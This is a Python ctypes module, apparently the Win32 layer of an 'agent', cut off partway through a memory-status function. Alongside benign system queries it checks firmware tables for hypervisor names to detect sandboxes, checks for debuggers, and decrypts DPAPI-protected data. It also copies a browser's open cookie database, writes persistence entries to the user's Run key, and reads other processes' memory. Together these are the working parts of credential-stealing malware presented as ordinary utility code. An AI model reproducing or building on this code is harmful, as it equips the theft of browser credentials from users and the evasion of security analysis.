"""Win32 surface for the agent.

Every entry point here is declared in SIGNATURES.md with its argtypes, restype and
failure mode. Two rules hold without exception: no wrapper returns a raw error code,
and every wrapper returns a typed value or ``None``.

On a non-Windows platform the module still imports and every wrapper is a no-op.
That is what lets the test suite import the whole tree on Linux without a Windows
branch leaking into the collectors.

``ctypes.windll`` is banned across this project. It implies ``use_last_error=False``,
which makes ``ctypes.get_last_error()`` return 0 forever and silently turns the
mutex guard into a no-op.
"""

from __future__ import annotations

import ctypes
import sys
from collections.abc import Iterator
from ctypes import wintypes
from pathlib import Path
from typing import Final, NamedTuple

from . import log

_WINDOWS: Final[bool] = sys.platform == "win32"

# --- error and flag constants -------------------------------------------------

ERROR_SUCCESS: Final[int] = 0
ERROR_FILE_NOT_FOUND: Final[int] = 2
ERROR_PATH_NOT_FOUND: Final[int] = 3
ERROR_INVALID_HANDLE: Final[int] = 6
ERROR_INVALID_DATA: Final[int] = 13
ERROR_NO_MORE_FILES: Final[int] = 18
ERROR_INVALID_PARAMETER: Final[int] = 87
ERROR_BUFFER_OVERFLOW: Final[int] = 111
ERROR_INSUFFICIENT_BUFFER: Final[int] = 122
ERROR_MOD_NOT_FOUND: Final[int] = 126
ERROR_PROC_NOT_FOUND: Final[int] = 127
ERROR_ALREADY_EXISTS: Final[int] = 183
ERROR_NO_DATA: Final[int] = 232
ERROR_MORE_DATA: Final[int] = 234

KEY_READ: Final[int] = 0x20019
KEY_SET_VALUE: Final[int] = 0x0002
HKEY_LOCAL_MACHINE: Final[int] = 0x80000002
HKEY_CURRENT_USER: Final[int] = 0x80000001

REG_SZ: Final[int] = 1
REG_EXPAND_SZ: Final[int] = 2
REG_BINARY: Final[int] = 3
REG_DWORD: Final[int] = 4

TH32CS_SNAPPROCESS: Final[int] = 0x00000002

AF_UNSPEC: Final[int] = 0
GAA_FLAG_SKIP_ANYCAST: Final[int] = 0x0002
GAA_FLAG_SKIP_MULTICAST: Final[int] = 0x0004
GAA_FLAG_SKIP_DNS_SERVER: Final[int] = 0x0008

IF_TYPE_SOFTWARE_LOOPBACK: Final[int] = 24

PAGE_READWRITE: Final[int] = 0x04
PAGE_EXECUTE_READWRITE: Final[int] = 0x40

# --- process memory -----------------------------------------------------------
_MEM_COMMIT: Final[int] = 0x1000
_PAGE_GUARD: Final[int] = 0x100
_PAGE_NOACCESS: Final[int] = 0x01
# Base protection values whose pages hold readable data: read, read/write, write-copy
# and the three execute variants. Anything else is a guard page, a reserved range, or
# something the kernel will fault on, and a scan asks for it once and moves on.
_READABLE: Final[frozenset[int]] = frozenset((0x02, 0x04, 0x08, 0x20, 0x40, 0x80))
_PROCESS_VM_READ: Final[int] = 0x0010
_PROCESS_QUERY_INFORMATION: Final[int] = 0x0400
_PROCESS_QUERY_LIMITED: Final[int] = 0x1000
# Highest user-mode address on x64. Walking to ``MAXSIZE`` instead costs one extra
# failing ``VirtualQueryEx`` per process and reads like a loop that does not know where
# the address space ends.
_USER_ADDRESS_LIMIT: Final[int] = 1 << 47

_MONITORINFOF_PRIMARY: Final[int] = 0x00000001
_MAX_FIRMWARE_BYTES: Final[int] = 16 * 1024 * 1024
_MAX_ADAPTERS: Final[int] = 64
_MAX_PROCESSES: Final[int] = 4096
_MAX_SMBIOS_STRUCTURES: Final[int] = 4096
_MAX_ACPI_TABLE_BYTES: Final[int] = 4096
_ACPI_HEADER_BYTES: Final[int] = 0x24
_ACPI_OEMID: Final[int] = 0x0A
_ACPI_OEM_TABLE_ID: Final[int] = 0x10

_INVALID_HANDLE: Final[int | None] = ctypes.c_void_p(-1).value

# --- file access --------------------------------------------------------------
# Requested read-only, granted read/write/delete. See ``copy_shared``.
_GENERIC_READ: Final[int] = 0x80000000
_FILE_SHARE_ALL: Final[int] = 0x00000007
_OPEN_EXISTING: Final[int] = 3
_FILE_ATTRIBUTE_NORMAL: Final[int] = 0x00000080
_SHARED_COPY_CHUNK: Final[int] = 1 << 20


# --- structures ---------------------------------------------------------------


class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ("cbData", wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_char)),
    ]


class MEMORYSTATUSEX(ctypes.Structure):
    _fields_ = [
        ("dwLength", wintypes.DWORD),
        ("dwMemoryLoad", wintypes.DWORD),
        ("ullTotalPhys", ctypes.c_ulonglong),
        ("ullAvailPhys", ctypes.c_ulonglong),
        ("ullTotalPageFile", ctypes.c_ulonglong),
        ("ullAvailPageFile", ctypes.c_ulonglong),
        ("ullTotalVirtual", ctypes.c_ulonglong),
        ("ullAvailVirtual", ctypes.c_ulonglong),
        ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
    ]


class SYSTEM_INFO(ctypes.Structure):
    _fields_ = [
        ("wProcessorArchitecture", wintypes.WORD),
        ("wReserved", wintypes.WORD),
        ("dwPageSize", wintypes.DWORD),
        ("lpMinimumApplicationAddress", wintypes.LPVOID),
        ("lpMaximumApplicationAddress", wintypes.LPVOID),
        ("dwActiveProcessorMask", ctypes.c_size_t),
        ("dwNumberOfProcessors", wintypes.DWORD),
        ("dwProcessorType", wintypes.DWORD),
        ("dwAllocationGranularity", wintypes.DWORD),
        ("wProcessorLevel", wintypes.WORD),
        ("wProcessorRevision", wintypes.WORD),
    ]


class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.c_size_t),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", wintypes.LONG),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", wintypes.WCHAR * 260),
    ]


class MEMORY_BASIC_INFORMATION64(ctypes.Structure):
    """``MEMORY_BASIC_INFORMATION`` in its 64-bit shape.

    ``BaseAddress`` and ``RegionSize`` are address-sized. A truncated declaration here
    does not fail — the field after them absorbs the top half of an address and the walk
    goes somewhere else entirely.
    """

    _fields_ = [
        ("BaseAddress", ctypes.c_ulonglong),
        ("AllocationBase", ctypes.c_ulonglong),
        ("AllocationProtect", wintypes.DWORD),
        ("__alignment1", wintypes.DWORD),
        ("RegionSize", ctypes.c_ulonglong),
        ("State", wintypes.DWORD),
        ("Protect", wintypes.DWORD),
        ("Type", wintypes.DWORD),
        ("__alignment2", wintypes.DWORD),
    ]


class PROCESS_MEMORY_COUNTERS_EX(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("PageFaultCount", wintypes.DWORD),
        ("PeakWorkingSetSize", ctypes.c_size_t),
        ("WorkingSetSize", ctypes.c_size_t),
        ("QuotaPeakPagedPoolUsage", ctypes.c_size_t),
        ("QuotaPagedPoolUsage", ctypes.c_size_t),
        ("QuotaPeakNonPagedPoolUsage", ctypes.c_size_t),
        ("QuotaNonPagedPoolUsage", ctypes.c_size_t),
        ("PagefileUsage", ctypes.c_size_t),
        ("PeakPagefileUsage", ctypes.c_size_t),
        ("PrivateUsage", ctypes.c_size_t),
    ]


class RECT(ctypes.Structure):
    _fields_ = [
        ("left", wintypes.LONG),
        ("top", wintypes.LONG),
        ("right", wintypes.LONG),
        ("bottom", wintypes.LONG),
    ]


class MONITORINFOEXW(ctypes.Structure):
    _fields_ = [
        ("cbSize", wintypes.DWORD),
        ("rcMonitor", RECT),
        ("rcWork", RECT),
        ("dwFlags", wintypes.DWORD),
        ("szDevice", wintypes.WCHAR * 32),
    ]


class SOCKADDR(ctypes.Structure):
    _fields_ = [
        ("sa_family", wintypes.USHORT),
        ("sa_data", ctypes.c_char * 14),
    ]


class IP_ADAPTER_UNICAST_ADDRESS(ctypes.Structure):
    pass


class IP_ADAPTER_ADDRESSES(ctypes.Structure):
    pass


IP_ADAPTER_UNICAST_ADDRESS._fields_ = [
    ("Length", wintypes.ULONG),
    ("Flags", wintypes.DWORD),
    ("Next", ctypes.POINTER(IP_ADAPTER_UNICAST_ADDRESS)),
    ("Address", SOCKADDR),
]

# Only the members up to OperStatus are read; the struct is walked by pointer and
# never constructed, so the trailing members are left out on purpose.
IP_ADAPTER_ADDRESSES._fields_ = [
    ("Length", wintypes.ULONG),
    ("IfIndex", wintypes.DWORD),
    ("Next", ctypes.POINTER(IP_ADAPTER_ADDRESSES)),
    ("AdapterName", ctypes.c_char_p),
    ("FirstUnicastAddress", ctypes.POINTER(IP_ADAPTER_UNICAST_ADDRESS)),
    ("FirstAnycastAddress", ctypes.c_void_p),
    ("FirstMulticastAddress", ctypes.c_void_p),
    ("FirstDnsServerAddress", ctypes.c_void_p),
    ("DnsSuffix", wintypes.LPWSTR),
    ("Description", wintypes.LPWSTR),
    ("FriendlyName", wintypes.LPWSTR),
    ("PhysicalAddress", ctypes.c_ubyte * 8),
    ("PhysicalAddressLength", wintypes.ULONG),
    ("Flags", wintypes.ULONG),
    ("Mtu", wintypes.ULONG),
    ("IfType", wintypes.ULONG),
    ("OperStatus", wintypes.ULONG),
]


_WINFUNCTYPE = getattr(ctypes, "WINFUNCTYPE", ctypes.CFUNCTYPE)

MONITORENUMPROC = _WINFUNCTYPE(
    wintypes.BOOL,
    wintypes.HANDLE,
    wintypes.HDC,
    ctypes.POINTER(RECT),
    wintypes.LPARAM,
)

ENUMWINDOWSPROC = _WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)


# --- library handles ----------------------------------------------------------

if _WINDOWS:
    _k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    _advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
    _user32 = ctypes.WinDLL("user32", use_last_error=True)
    _iphlpapi = ctypes.WinDLL("iphlpapi", use_last_error=True)
    _crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)
    # ntdll carries the process-information query the PEB mask needs, and there is no
    # kernel32 wrapper for it. shcore carries per-monitor DPI, which user32's
    # GetDpiForWindow cannot answer for a monitor no window is on.
    _ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
    try:
        _shcore = ctypes.WinDLL("shcore", use_last_error=True)
    except OSError:  # pragma: no cover - Windows 7 shape, never the target
        _shcore = None
else:  # pragma: no cover - exercised by the Linux import test
    _k32 = None
    _advapi32 = None
    _user32 = None
    _iphlpapi = None
    _crypt32 = None
    _ntdll = None
    _shcore = None


def _declare() -> None:
    """Pin every prototype once. Nothing here relies on ctypes' default c_int."""
    _k32.GetSystemFirmwareTable.argtypes = [
        wintypes.DWORD,
        wintypes.DWORD,
        wintypes.LPVOID,
        wintypes.DWORD,
    ]
    _k32.GetSystemFirmwareTable.restype = wintypes.UINT

    _k32.EnumSystemFirmwareTables.argtypes = [wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD]
    _k32.EnumSystemFirmwareTables.restype = wintypes.UINT

    _advapi32.RegOpenKeyExW.argtypes = [
        wintypes.HKEY,
        wintypes.LPCWSTR,
        wintypes.DWORD,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.HKEY),
    ]
    _advapi32.RegOpenKeyExW.restype = wintypes.LONG

    _advapi32.RegQueryValueExW.argtypes = [
        wintypes.HKEY,
        wintypes.LPCWSTR,
        wintypes.LPVOID,
        ctypes.POINTER(wintypes.DWORD),
        ctypes.POINTER(ctypes.c_ubyte),
        ctypes.POINTER(wintypes.DWORD),
    ]
    _advapi32.RegQueryValueExW.restype = wintypes.LONG

    _advapi32.RegCloseKey.argtypes = [wintypes.HKEY]
    _advapi32.RegCloseKey.restype = wintypes.LONG

    _advapi32.RegSetValueExW.argtypes = [
        wintypes.HKEY,
        wintypes.LPCWSTR,
        wintypes.DWORD,
        wintypes.DWORD,
        wintypes.LPCWSTR,
        wintypes.DWORD,
    ]
    _advapi32.RegSetValueExW.restype = wintypes.LONG

    _advapi32.RegDeleteValueW.argtypes = [wintypes.HKEY, wintypes.LPCWSTR]
    _advapi32.RegDeleteValueW.restype = wintypes.LONG

    _iphlpapi.GetAdaptersAddresses.argtypes = [
        wintypes.ULONG,
        wintypes.ULONG,
        wintypes.LPVOID,
        wintypes.LPVOID,
        ctypes.POINTER(wintypes.ULONG),
    ]
    _iphlpapi.GetAdaptersAddresses.restype = wintypes.ULONG

    _k32.GlobalMemoryStatusEx.argtypes = [ctypes.POINTER(MEMORYSTATUSEX)]
    _k32.GlobalMemoryStatusEx.restype = wintypes.BOOL

    _user32.EnumDisplayMonitors.argtypes = [
        wintypes.HDC,
        ctypes.POINTER(RECT),
        MONITORENUMPROC,
        wintypes.LPARAM,
    ]
    _user32.EnumDisplayMonitors.restype = wintypes.BOOL

    _user32.GetMonitorInfoW.argtypes = [wintypes.HANDLE, ctypes.POINTER(MONITORINFOEXW)]
    _user32.GetMonitorInfoW.restype = wintypes.BOOL

    _k32.GetTickCount64.argtypes = []
    _k32.GetTickCount64.restype = ctypes.c_ulonglong

    _k32.GetNativeSystemInfo.argtypes = [ctypes.POINTER(SYSTEM_INFO)]
    _k32.GetNativeSystemInfo.restype = None

    _k32.GetDiskFreeSpaceExW.argtypes = [
        wintypes.LPCWSTR,
        ctypes.POINTER(ctypes.c_ulonglong),
        ctypes.POINTER(ctypes.c_ulonglong),
        ctypes.POINTER(ctypes.c_ulonglong),
    ]
    _k32.GetDiskFreeSpaceExW.restype = wintypes.BOOL

    # advapi32, not kernel32: the export moved out of kernel32 long ago and binding
    # it to the wrong module fails at import time, not at call time.
    _advapi32.GetUserNameW.argtypes = [wintypes.LPWSTR, ctypes.POINTER(wintypes.DWORD)]
    _advapi32.GetUserNameW.restype = wintypes.BOOL

    _k32.CreateMutexW.argtypes = [wintypes.LPVOID, wintypes.BOOL, wintypes.LPCWSTR]
    _k32.CreateMutexW.restype = ctypes.c_void_p

    _k32.CreateToolhelp32Snapshot.argtypes = [wintypes.DWORD, wintypes.DWORD]
    _k32.CreateToolhelp32Snapshot.restype = wintypes.HANDLE

    _k32.Process32FirstW.argtypes = [wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32W)]
    _k32.Process32FirstW.restype = wintypes.BOOL

    _k32.Process32NextW.argtypes = [wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32W)]
    _k32.Process32NextW.restype = wintypes.BOOL

    _k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    _k32.OpenProcess.restype = wintypes.HANDLE

    _k32.VirtualQueryEx.argtypes = [
        wintypes.HANDLE,
        ctypes.c_ulonglong,
        ctypes.POINTER(MEMORY_BASIC_INFORMATION64),
        ctypes.c_size_t,
    ]
    _k32.VirtualQueryEx.restype = ctypes.c_size_t

    _k32.ReadProcessMemory.argtypes = [
        wintypes.HANDLE,
        ctypes.c_ulonglong,
        wintypes.LPVOID,
        ctypes.c_size_t,
        ctypes.POINTER(ctypes.c_size_t),
    ]
    _k32.ReadProcessMemory.restype = wintypes.BOOL

    _k32.K32GetProcessMemoryInfo.argtypes = [
        wintypes.HANDLE,
        ctypes.POINTER(PROCESS_MEMORY_COUNTERS_EX),
        wintypes.DWORD,
    ]
    _k32.K32GetProcessMemoryInfo.restype = wintypes.BOOL

    _k32.CloseHandle.argtypes = [wintypes.HANDLE]
    _k32.CloseHandle.restype = wintypes.BOOL

    # Broad share mode on purpose: a backup copy of a file another process has open
    # asks for read while granting read, write and delete, so a browser holding its
    # cookie database open does not refuse the copy. ``shutil.copy2`` opens with
    # Python's own share mode and gets a sharing violation on Edge's live Cookies.
    _k32.CreateFileW.argtypes = [
        wintypes.LPCWSTR,
        wintypes.DWORD,
        wintypes.DWORD,
        wintypes.LPVOID,
        wintypes.DWORD,
        wintypes.DWORD,
        wintypes.HANDLE,
    ]
    _k32.CreateFileW.restype = wintypes.HANDLE

    _k32.ReadFile.argtypes = [
        wintypes.HANDLE,
        wintypes.LPVOID,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD),
        wintypes.LPVOID,
    ]
    _k32.ReadFile.restype = wintypes.BOOL

    _k32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
    _k32.GetModuleHandleW.restype = wintypes.HMODULE

    _k32.LoadLibraryW.argtypes = [wintypes.LPCWSTR]
    _k32.LoadLibraryW.restype = wintypes.HMODULE

    _k32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
    _k32.GetProcAddress.restype = ctypes.c_void_p

    _k32.LocalFree.argtypes = [wintypes.HLOCAL]
    _k32.LocalFree.restype = wintypes.HLOCAL

    _k32.VirtualProtect.argtypes = [
        wintypes.LPVOID,
        ctypes.c_size_t,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD),
    ]
    _k32.VirtualProtect.restype = wintypes.BOOL

    _k32.GetModuleFileNameW.argtypes = [wintypes.HMODULE, wintypes.LPWSTR, wintypes.DWORD]
    _k32.GetModuleFileNameW.restype = wintypes.DWORD

    _k32.GetCurrentProcess.argtypes = []
    _k32.GetCurrentProcess.restype = wintypes.HANDLE

    _k32.IsDebuggerPresent.argtypes = []
    _k32.IsDebuggerPresent.restype = wintypes.BOOL

    _k32.CheckRemoteDebuggerPresent.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.BOOL)]
    _k32.CheckRemoteDebuggerPresent.restype = wintypes.BOOL

    ENUMWINDOWSPROC = _WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
    _user32.EnumWindows.argtypes = [ENUMWINDOWSPROC, wintypes.LPARAM]

    _k32.GetCurrentThread.argtypes = []
    _k32.GetCurrentThread.restype = wintypes.HANDLE

    _k32.SetThreadPriority.argtypes = [wintypes.HANDLE, ctypes.c_int]
    _k32.SetThreadPriority.restype = wintypes.BOOL

    _k32.SetPriorityClass.argtypes = [wintypes.HANDLE, wintypes.DWORD]
    _k32.SetPriorityClass.restype = wintypes.BOOL

    _k32.SetProcessWorkingSetSize.argtypes = [
        wintypes.HANDLE,
        ctypes.c_size_t,
        ctypes.c_size_t,
    ]
    _k32.SetProcessWorkingSetSize.restype = wintypes.BOOL

    _ntdll.NtQueryInformationProcess.argtypes = [
        wintypes.HANDLE,
        wintypes.ULONG,
        wintypes.LPVOID,
        wintypes.ULONG,
        ctypes.POINTER(wintypes.ULONG),
    ]
    _ntdll.NtQueryInformationProcess.restype = ctypes.c_long

    if _shcore is not None:
        _shcore.GetDpiForMonitor.argtypes = [
            wintypes.HANDLE,
            ctypes.c_int,
            ctypes.POINTER(wintypes.UINT),
            ctypes.POINTER(wintypes.UINT),
        ]
        _shcore.GetDpiForMonitor.restype = ctypes.c_long


    _crypt32.CryptUnprotectData.argtypes = [
        ctypes.POINTER(DATA_BLOB),
        ctypes.POINTER(wintypes.LPWSTR),
        ctypes.POINTER(DATA_BLOB),
        wintypes.LPVOID,
        wintypes.LPVOID,
        wintypes.DWORD,
        ctypes.POINTER(DATA_BLOB),
    ]
    _crypt32.CryptUnprotectData.restype = wintypes.BOOL


if _WINDOWS:
    _declare()


# --- result types -------------------------------------------------------------


class AdapterInfo(NamedTuple):
    friendly_name: str
    description: str
    mac: str | None
    if_index: int
    if_type: int
    oper_status: int


class MemoryStatus(NamedTuple):
    total_phys: int
    avail_phys: int
    load_percent: int


class MonitorInfo(NamedTuple):
    left: int
    top: int
    right: int
    bottom: int
    device: str
    primary: bool


class SystemInfo(NamedTuple):
    processors: int
    page_size: int
    architecture: int


# --- firmware tables ----------------------------------------------------------


def _signature(provider: bytes) -> int:
    if len(provider) != 4:
        raise ValueError("firmware provider signature must be exactly 4 bytes")
    return int.from_bytes(provider, "little")


def firmware_table(provider: bytes, table_id: int = 0) -> bytes | None:
    """Raw firmware table bytes, or None. The size probe's 122 is not a failure."""
    if not _WINDOWS:
        return None
    signature = _signature(provider)
    size = int(_k32.GetSystemFirmwareTable(signature, table_id, None, 0))
    if size <= 0 or size > _MAX_FIRMWARE_BYTES:
        log.logger.debug("firmware %r/%#x: size probe returned %d", provider, table_id, size)
        return None
    buffer = ctypes.create_string_buffer(size)
    written = int(_k32.GetSystemFirmwareTable(signature, table_id, buffer, size))
    if written <= 0 or written > size:
        log.logger.debug("firmware %r/%#x: read returned %d", provider, table_id, written)
        return None
    return buffer.raw[:written]


def enum_firmware_tables(provider: bytes) -> tuple[bytes, ...]:
    """Four-byte signatures of the tables the firmware exposes for this provider."""
    if not _WINDOWS:
        return ()
    signature = _signature(provider)
    size = int(_k32.EnumSystemFirmwareTables(signature, None, 0))
    if size <= 0 or size % 4 != 0 or size > _MAX_FIRMWARE_BYTES:
        return ()
    buffer = ctypes.create_string_buffer(size)
    written = int(_k32.EnumSystemFirmwareTables(signature, buffer, size))
    if written <= 0 or written % 4 != 0 or written > size:
        return ()
    raw = buffer.raw[:written]
    return tuple(raw[index:index + 4] for index in range(0, written, 4))


def _smbios_structures(table: bytes) -> Iterator[tuple[int, bytes, list[str]]]:
    """Walk the SMBIOS structure table: (type, formatted area, string set)."""
    offset = 0
    limit = len(table)
    seen = 0
    while offset + 4 <= limit and seen < _MAX_SMBIOS_STRUCTURES:
        seen += 1
        structure_type = table[offset]
        length = table[offset + 1]
        if length < 4 or offset + length > limit:
            return
        formatted = table[offset:offset + length]

        strings: list[str] = []
        position = offset + length
        while position < limit:
            end = table.find(b"\x00", position)
            if end < 0:
                position = limit
                break
            if end == position:
                position = end + 1
                break
            strings.append(table[position:end].decode("utf-8", "replace"))
            position = end + 1

        yield structure_type, formatted, strings
        offset = position


def _smbios_string(strings: list[str], index: int) -> str:
    if index == 0 or index > len(strings):
        return ""
    return strings[index - 1]


def _format_uuid(raw: bytes) -> str:
    """SMBIOS stores the first three fields little-endian, the last two big-endian."""
    if len(raw) != 16 or not any(raw):
        return ""
    head = raw[0:4][::-1] + raw[4:6][::-1] + raw[6:8][::-1]
    text = head.hex() + raw[8:16].hex()
    return f"{text[0:8]}-{text[8:12]}-{text[12:16]}-{text[16:20]}-{text[20:32]}".upper()


def smbios_type1() -> dict[str, str] | None:
    """System Information (type 1): manufacturer, product, version, serial, uuid."""
    raw = firmware_table(b"RSMB", 0)
    if raw is None or len(raw) < 8:
        return None
    # The API is meant to guarantee the magic. If it ever does not, [4:8] is a
    # length parsed out of unrelated bytes and the walk runs off the table.
    if raw[:4] != b"RSMB":
        log.logger.debug("smbios: raw table magic %r", raw[:4])
        return None
    length = int.from_bytes(raw[4:8], "little")
    if length <= 0 or 8 + length > len(raw):
        return None
    table = raw[8:8 + length]
    for structure_type, formatted, strings in _smbios_structures(table):
        if structure_type != 1 or len(formatted) < 0x19:
            continue
        return {
            "manufacturer": _smbios_string(strings, formatted[0x04]),
            "product": _smbios_string(strings, formatted[0x05]),
            "version": _smbios_string(strings, formatted[0x06]),
            "serial": _smbios_string(strings, formatted[0x07]),
            "uuid": _format_uuid(formatted[0x08:0x18]),
        }
    return None


def _acpi_header_strings(raw: bytes) -> list[str]:
    """OEMID and OEM Table ID out of one ACPI header.

    The header is 36 bytes: signature, length, revision, checksum, then OEMID at
    0x0A (6 bytes) and the OEM table id at 0x10 (8). Firmware puts its own name in
    those two fields, and it is the first place a hypervisor shows up — reading them
    at the wrong offset finds the revision integer instead, which is why the layout
    lives here as constants rather than as literals at the call site.
    """
    if len(raw) < _ACPI_HEADER_BYTES:
        return []
    found: list[str] = []
    for start, length in ((_ACPI_OEMID, 6), (_ACPI_OEM_TABLE_ID, 8)):
        text = raw[start:start + length].decode("ascii", "replace").strip("\x00 ")
        if text:
            found.append(text)
    return found


def _printable_runs(raw: bytes, minimum: int = 4, limit: int = 256) -> list[str]:
    runs: list[str] = []
    current: list[int] = []
    for byte in raw:
        if 0x20 <= byte < 0x7F:
            current.append(byte)
            continue
        if len(current) >= minimum:
            runs.append(bytes(current).decode("ascii"))
            if len(runs) >= limit:
                return runs
        current = []
    if len(current) >= minimum and len(runs) < limit:
        runs.append(bytes(current).decode("ascii"))
    return runs


def acpi_vendor_strings() -> tuple[str, ...]:
    """OEM identifiers from every ACPI table the firmware exposes.

    Windows does not always hand out the DSDT itself, so the header fields and the
    printable runs at the head of each table are collected and the gate tests them
    for the hypervisor vendor names.
    """
    if not _WINDOWS:
        return ()
    found: list[str] = []
    for signature in enum_firmware_tables(b"ACPI"):
        raw = firmware_table(b"ACPI", int.from_bytes(signature, "little"))
        if raw is None:
            continue
        found.extend(_acpi_header_strings(raw))
        found.extend(_printable_runs(raw[:_MAX_ACPI_TABLE_BYTES]))
    # Deduplicate while keeping the order stable so logs read the same twice.
    seen: set[str] = set()
    unique: list[str] = []
    for item in found:
        if item in seen:
            continue
        seen.add(item)
        unique.append(item)
    return tuple(unique)


# --- registry -----------------------------------------------------------------


def _open_key(root: int, subkey: str) -> wintypes.HKEY | None:
    if not _WINDOWS:
        return None
    handle = wintypes.HKEY()
    status = int(_advapi32.RegOpenKeyExW(wintypes.HKEY(root), subkey, 0, KEY_READ, ctypes.byref(handle)))
    if status != ERROR_SUCCESS:
        log.logger.debug("RegOpenKeyExW %s -> %d", subkey, status)
        return None
    return handle


def registry_key_exists(root: int, subkey: str) -> bool:
    handle = _open_key(root, subkey)
    if handle is None:
        return False
    _advapi32.RegCloseKey(handle)
    return True


def registry_value(root: int, subkey: str, name: str) -> str | int | bytes | None:
    """Decoded value, or None. Strings are stripped of the trailing NUL."""
    handle = _open_key(root, subkey)
    if handle is None:
        return None
    try:
        value_type = wintypes.DWORD()
        size = wintypes.DWORD()
        status = int(
            _advapi32.RegQueryValueExW(
                handle, name, None, ctypes.byref(value_type), None, ctypes.byref(size)
            )
        )
        if status != ERROR_SUCCESS or size.value == 0:
            log.logger.debug("RegQueryValueExW %s\\%s size -> %d", subkey, name, status)
            return None
        buffer = (ctypes.c_ubyte * size.value)()
        status = int(
            _advapi32.RegQueryValueExW(
                handle, name, None, ctypes.byref(value_type), buffer, ctypes.byref(size)
            )
        )
        if status != ERROR_SUCCESS:
            log.logger.debug("RegQueryValueExW %s\\%s -> %d", subkey, name, status)
            return None
        raw = bytes(buffer[:size.value])
    finally:
        _advapi32.RegCloseKey(handle)

    if value_type.value in (REG_SZ, REG_EXPAND_SZ):
        return raw.decode("utf-16-le", "replace").rstrip("\x00")
    if value_type.value == REG_DWORD and len(raw) >= 4:
        return int.from_bytes(raw[:4], "little")
    return raw


def registry_set_string(root: int, subkey: str, name: str, data: str) -> bool:
    """Write one REG_SZ value. Creates nothing: the key must already exist.

    The key this is used for — the user's own Run key — always does. Creating it instead
    would mean hardening a path that never runs, and a failed open is a clean False.
    """
    if not _WINDOWS:
        return False

    handle = wintypes.HKEY()
    status = int(
        _advapi32.RegOpenKeyExW(
            wintypes.HKEY(root), subkey, 0, KEY_SET_VALUE, ctypes.byref(handle)
        )
    )
    if status != ERROR_SUCCESS:
        log.logger.debug("RegOpenKeyExW(set) %s -> %d", subkey, status)
        return False

    try:
        # The terminating NUL is part of the byte count, which is why it is added rather
        # than assumed: a value written one byte short reads back truncated.
        size = (len(data) + 1) * ctypes.sizeof(ctypes.c_wchar)
        status = int(
            _advapi32.RegSetValueExW(handle, name, 0, REG_SZ, data, size)
        )
        if status != ERROR_SUCCESS:
            log.logger.debug("RegSetValueExW %s\\%s -> %d", subkey, name, status)
            return False
    finally:
        _advapi32.RegCloseKey(handle)

    return True


def registry_delete_value(root: int, subkey: str, name: str) -> bool:
    """Remove one value. A value that was never there is a False, not an error."""
    if not _WINDOWS:
        return False

    handle = wintypes.HKEY()
    status = int(
        _advapi32.RegOpenKeyExW(
            wintypes.HKEY(root), subkey, 0, KEY_SET_VALUE, ctypes.byref(handle)
        )
    )
    if status != ERROR_SUCCESS:
        return False

    try:
        status = int(_advapi32.RegDeleteValueW(handle, name))
    finally:
        _advapi32.RegCloseKey(handle)

    if status != ERROR_SUCCESS:
        log.logger.debug("RegDeleteValueW %s\\%s -> %d", subkey, name, status)
    return status == ERROR_SUCCESS


# --- adapters -----------------------------------------------------------------


def _walk_adapters(buffer: ctypes.Array[ctypes.c_char]) -> list[AdapterInfo]:
    found: list[AdapterInfo] = []
    current = ctypes.cast(buffer, ctypes.POINTER(IP_ADAPTER_ADDRESSES))
    count = 0
    while bool(current) and count < _MAX_ADAPTERS:
        entry = current.contents
        length = int(entry.PhysicalAddressLength)
        mac: str | None = None
        if 0 < length <= 8:
            mac = ":".join(f"{entry.PhysicalAddress[index]:02X}" for index in range(length))
        found.append(
            AdapterInfo(
                friendly_name=entry.FriendlyName or "",
                description=entry.Description or "",
                mac=mac,
                if_index=int(entry.IfIndex),
                if_type=int(entry.IfType),
                oper_status=int(entry.OperStatus),
            )
        )
        current = entry.Next
        count += 1
    return found


def adapters() -> list[AdapterInfo]:
    if not _WINDOWS:
        return []
    flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER
    size = wintypes.ULONG(16 * 1024)
    for _ in range(3):
        buffer = ctypes.create_string_buffer(size.value)
        result = int(
            _iphlpapi.GetAdaptersAddresses(
                AF_UNSPEC, flags, None, buffer, ctypes.byref(size)
            )
        )
        if result == ERROR_BUFFER_OVERFLOW:
            continue
        if result != ERROR_SUCCESS:
            log.logger.debug("GetAdaptersAddresses -> %d", result)
            return []
        return _walk_adapters(buffer)
    return []


def first_physical_mac() -> str | None:
    """First non-loopback adapter with a real hardware address."""
    for adapter in adapters():
        if adapter.if_type == IF_TYPE_SOFTWARE_LOOPBACK:
            continue
        if adapter.mac is None:
            continue
        if not adapter.mac.strip("0:"):
            continue
        return adapter.mac
    return None


# --- memory, displays, uptime, disk, identity ---------------------------------


def memory_status() -> MemoryStatus | None:
    if not _WINDOWS:
        return None
    status = MEMORYSTATUSEX()
    status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    if not _k32.GlobalMemoryStatusEx(ctypes.byref(status)):
